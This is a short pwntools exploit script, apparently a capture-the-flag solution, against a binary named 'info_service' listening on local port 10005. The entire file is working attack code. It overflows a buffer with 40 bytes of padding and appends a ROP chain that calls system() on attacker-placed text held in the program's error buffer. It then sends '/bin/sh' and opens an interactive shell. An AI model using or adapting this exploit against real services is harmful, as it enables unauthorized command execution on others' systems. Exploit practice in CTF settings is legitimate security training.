#!/usr/bin/env python2
from pwn import *
context.arch = "amd64"

elf = ELF("./info_service")

def loc():
    return process("./info_service")

def rem():
    return remote("127.0.0.1", 10005)

r = rem()

system = elf.plt["system"]
LAST_ERROR = elf.symbols["LAST_ERROR"]
error_message = "Unknown command: "
command_address = LAST_ERROR + len(error_message)
pop_rdi = 0x400933
ret = pop_rdi + 1

rop_chain = p64(pop_rdi) + p64(command_address) + p64(ret) + p64(system)
payload = "A" * 40 + rop_chain

r.sendline(payload)
r.sendline("/bin/sh")
r.sendline("exit")
r.recv(1024)
r.interactive()